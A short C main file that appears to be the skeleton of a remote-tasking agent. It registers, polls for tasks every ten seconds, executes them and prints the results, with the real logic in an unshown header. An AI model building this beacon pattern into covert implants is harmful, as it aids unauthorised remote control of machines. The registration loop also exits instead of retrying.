#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>

#include "initiate.h"

int main(void)
{
    struct strings_array sa = { NULL, NULL, 0, 1, 0, NULL};

    bool registered = false;
    while(!registered) {
        if(reg()) {
            puts("Registered\n");
            registered = true;
            continue;
        } else {
            puts("Not Registered, trying again\n");
            sleep(5);
            break;
        }

    }

    // char *task_results;
    while(true) {
        puts("Checking tasks\n");
        // Check tasks will eventually return an array of strings.
        // The number of elements in that array will dictate how.
        // Many tasks there were and how many times execute_tasks
        // will be called.
        check_tasks();

        execute_tasks(&sa);

        for (unsigned int i = 0; i < sa.sz; i++) {
            printf("%s\n", sa.words[i]);
        }

        sleep(10);
    }
        
}